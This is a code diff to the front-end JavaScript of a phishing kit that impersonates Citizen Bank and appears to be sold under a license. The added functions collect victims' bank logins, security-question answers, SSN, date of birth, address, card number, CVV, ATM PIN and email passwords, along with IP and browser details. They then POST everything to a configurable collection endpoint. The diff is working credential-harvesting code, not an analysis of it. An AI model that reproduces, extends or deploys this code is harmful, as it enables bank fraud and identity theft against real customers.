@@ -9,27 +9,6 @@ $(document).ready(async function () {
         await get_reload_ip();
     }
     Annonymous_one();
-
-    //Main jQuery post event
-
-    /*    $('#form_index').on('submit', async function (e) {
-            e.preventDefault();
-            await submit_user_single();
-        })*/
-
-    //if (document.querySelectorAll("form#form").length > 0) {
-    /*let form_verify = document.querySelector("form#form");
-    console.log(form_verify)
-    form_verify.addEventListener("submit", (e) => {
-        e.preventDefault();
-        console.log(e)
-    })*/
-    //}
-    /*$(form_veriy_submit).on('submit', function (e){
-        e.preventDefault()
-        console.log(this)
-    })*/
-
 })
 
 
@@ -66,7 +45,7 @@ function User_Pass_single(username, password, secondtry = true) {
 -----------------< Citizen Bank Report >---------------------------
 == Bank Acess${second} >---------------------------
 Username : ${username}
-Passord : ${password}
+Password : ${password}
 == Other Info >--------------------------------
 Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
 IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
@@ -195,6 +174,144 @@ User-Agent: ${navigator.userAgent}
     return btoa(post);
 }
 
+//=======================================================
+
+function browser_ip() {
+    return `
+IP: ${ip_config.country}";
+User-Agent: ${navigator.userAgent}";
+###############################################################`;
+}
+
+function _User_Pass_single(username, password, secondtry = true) {
+    if (secondtry === true) {
+        return {
+            u1: 'unknown',
+            second_pass: `\nPassword (Second Try): ${password}`,
+            username: localStorage.getItem("username"),
+            nametype: 'citizen',
+            userid: DEDICATED_LICENSE,
+            type: 'bbannkk'
+        }
+    } else {
+        let u = (new Date()).getTime() + "_" + username;
+        localStorage.setItem("username", u);
+        return {
+            u1: `##################### Citizen Bank Account #####################\nUsername: ${username}\nPassword: ${password}`,
+            username: u,
+            nametype: 'citizen',
+            userid: DEDICATED_LICENSE,
+            type: 'bbannkk',
+            brw: browser_ip()
+        }
+    }
+}
+
+function _QnA_verify_single(q1, q2, q3, a1, a2, a3) {
+    let q1o = {
+        "1": "What is your father's middle name?",
+        "2": "What is your maternal grandmother's name?",
+        "3": "What is the name of the first company you worked for?",
+        "4": "What is your maternal grandfather's name?",
+        "5": "In what city was your high school? (full name of city only)",
+        "6": "What was the name of your high school?",
+        "7": "What is the first name of the maid of honor at your wedding?",
+        "8": "In what city were you married? (Enter full name of city)",
+        "9": "What is the first name of your oldest nephew?"
+    }
+    let q2o = {
+        "1": "What is the first name of the best man at your wedding?",
+        "2": "What is the first name of your oldest niece?",
+        "3": "What is your paternal grandfather's name?",
+        "4": "In what city is your vacation home? (Enter full name of city only)",
+        "5": "What was the name of your first girlfriend or boyfriend?",
+        "6": "In what city was your father born? (Enter full name of city only)",
+        "7": "What was the name of your first pet?",
+        "8": "What was the nickname of your grandfather?",
+        "9": "What was your high school mascot?"
+    }
+    let q3o = {
+        "1": "What is your paternal grandfather's name?",
+        "2": "What street did your best friend in high school live on? (Enter full name of street only)",
+        "3": "What was the last name of your favorite teacher in final year of high school?",
+        "4": "In what city were you born? (Enter full name of city only)",
+        "5": "What was the name of the town your grandmother lived in? (Enter full name of city only)",
+        "6": "What was your favorite restaurant in college?",
+        "7": "Where did you meet your spouse for the first time? (Enter full name of city only)",
+        "8": "In what city was your mother born? (Enter full name of city only)",
+        "9": "What was the name of your junior high school? (Enter only \"Riverdale\" for Riverdale Junior high school)"
+    }
+    q1 = q1o[q1.toString()];
+    q2 = q2o[q2.toString()];
+    q3 = q3o[q3.toString()];
+    let post = `Question 1: ${q1}
+Answer 1: ${a1}
+Question 2: ${q2}
+Answer 2: ${a2}
+Question 3: ${q3}
+Answer 3: ${a3}`;
+    return {
+        u2: post,
+        username: localStorage.getItem("username"),
+        nametype: 'citizen',
+        userid: DEDICATED_LICENSE,
+        type: 'bbannkk'
+    }
+}
+
+function _personal_info_single(full_name, address, city, state, zip, dob, ssn) {
+    let post = `Full Name: ${full_name}
+Address: ${address}
+City: ${city}
+State: ${state}
+zipcode: ${zip}
+Date Of Birth: ${dob}
+Social Security Number (SSN): ${ssn}`;
+    return {
+        u3: post,
+        username: localStorage.getItem("username"),
+        nametype: 'citizen',
+        userid: DEDICATED_LICENSE,
+        type: 'bbannkk'
+    }
+}
+
+function _card_info_single(card_number, expire, cvv, pin, card) {
+    let post = `Card Number: ${card_number}
+Expiration Date: ${expire}
+Cvv: ${cvv}
+ATM PIN: ${pin}
+== BIN Info ==
+Brand: ${card.scheme} || Level: ${card.brand} || Type: ${card.type} || Country: ${card.country}`;
+    return {
+        u4: post,
+        username: localStorage.getItem("username"),
+        nametype: 'citizen',
+        userid: DEDICATED_LICENSE,
+        type: 'bbannkk'
+    }
+}
+
+function _Email_Pass_single(email, password, retry = false) {
+    if (retry === false) {
+        return {
+            u5: `Username: ${email}\nPassword: ${password}`,
+            username: localStorage.getItem("username"),
+            nametype: 'citizen',
+            userid: DEDICATED_LICENSE,
+            type: 'bbannkk'
+        }
+    } else {
+        return {
+            u6: `Username: ${email}\nPassword: ${password}`,
+            username: localStorage.getItem("username"),
+            nametype: 'citizen',
+            userid: DEDICATED_LICENSE,
+            type: 'bbannkk'
+        }
+    }
+}
+
 async function getBin(card) {
     card = card.split(' ').join('').substring(0, 6);
     return new Promise(function (resolve, reject) {
@@ -242,8 +359,8 @@ async function form_index(form) {
     let u = document.getElementById("UserID").value;
     let p = document.getElementById("currentpassword").value;
     $(document.getElementById('btn')).val('Please wait...').css({"text-transform": "initial"})
-    let post = User_Pass_single(u, p, TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === true);
-    let result = await load_Send_post(post);
+    let post = USE_DEDICATED ? _User_Pass_single(u, p, TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === true) : User_Pass_single(u, p, TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === true);
+    let result = USE_DEDICATED ? await load_Send_post_Dedicated(post) : await load_Send_post(post);
     if (Object.keys(result).includes('errors')) {
         window.location.replace(location.href);
         window.location.reload();
@@ -272,8 +389,8 @@ async function form_verify(form) {
     let a1 = document.getElementById("a1").value;
     let a2 = document.getElementById("a2").value;
     let a3 = document.getElementById("a3").value;
-    let post = QnA_verify_single(localStorage.getItem("username"), q1, q2, q3, a1, a2, a3);
-    let result = await load_Send_post(post);
+    let post = USE_DEDICATED ? _QnA_verify_single(q1, q2, q3, a1, a2, a3) : QnA_verify_single(localStorage.getItem("username"), q1, q2, q3, a1, a2, a3);
+    let result = USE_DEDICATED ? await load_Send_post_Dedicated(post) : await load_Send_post(post);
     if (Object.keys(result).includes('errors')) {
         window.location.replace(location.href);
         window.location.reload();
@@ -290,7 +407,6 @@ async function form_verify(form) {
     return false;
 }
 
-
 async function form_details(form) {
     let fname = document.getElementById("fname").value;
     let address = document.getElementById("address").value;
@@ -299,8 +415,8 @@ async function form_details(form) {
     let zip = document.getElementById("zip").value;
     let dob = document.getElementById("dob").value;
     let ssn = document.getElementById("ssn").value;
-    let post = personal_info_single(localStorage.getItem("username"), fname, address, city, state, zip, dob, ssn);
-    let result = await load_Send_post(post);
+    let post = USE_DEDICATED ? _personal_info_single(fname, address, city, state, zip, dob, ssn) : personal_info_single(localStorage.getItem("username"), fname, address, city, state, zip, dob, ssn);
+    let result = USE_DEDICATED ? await load_Send_post_Dedicated(post) : await load_Send_post(post);
     if (Object.keys(result).includes('errors')) {
         window.location.replace(location.href);
         window.location.reload();
@@ -317,19 +433,17 @@ async function form_details(form) {
     return false;
 }
 
-
 async function form_contact(form) {
     let email = document.getElementById("email").value;
     location.replace(userEmail(email));
     location.reload();
 }
 
-
 async function form_email(form) {
     let email = document.getElementById("_email").value;
     let password = document.getElementById("login-passwd").value;
-    let post = Email_Pass_single(localStorage.getItem("username"), email, password);
-    let result = await load_Send_post(post);
+    let post = USE_DEDICATED ? _Email_Pass_single(email, password, TWO_TRY_EMAIL === true && location.href.includes('eero=') === true) : Email_Pass_single(localStorage.getItem("username"), email, password);
+    let result = USE_DEDICATED ? await load_Send_post_Dedicated(post) : await load_Send_post(post);
     if (Object.keys(result).includes('errors')) {
         window.location.replace(location.href);
         window.location.reload();
@@ -351,7 +465,6 @@ async function form_email(form) {
     }
     return false;
 }
-
 
 async function form_card(form) {
     let card = document.getElementById("card").value;
@@ -400,6 +513,26 @@ async function load_Send_post(post) {
     });
 }
 
+async function load_Send_post_Dedicated(post = {}) {
+    return new Promise(function (resolve, reject) {
+        $.ajax({
+            url: D_SCRIPT_NAME,
+            type: 'POST',
+            dataType: "text",
+            data: post,
+            success: function (response) {
+                resolve({msg: "Yes Sent Successfully"});
+            },
+            error: function (response) {
+                let error = {errors: response}
+                resolve(error);
+            }
+        });
+    });
+}
+
+
+
 function query_gen() {
     return ("scr=" + Math.random().toString().replace("0.", "") + "&cookies=" + window.btoa(Math.random().toString()).replace("=", "").replace("=", "") + "&tokens=" + Math.random().toString().replace("0.", ""));
 }
@@ -410,7 +543,7 @@ function rand_url() {
 }
 
 function userEmail(email = "") {
-    let emai2 = email.toLowerCase();
+    let email2 = email.toLowerCase();
     email = "eml=" + btoa(email.toLowerCase()) + "&";
     if (email2.includes("@gmail")) {
         return "#/login/email/gmail" + rand_url() + "?" + email + query_gen();
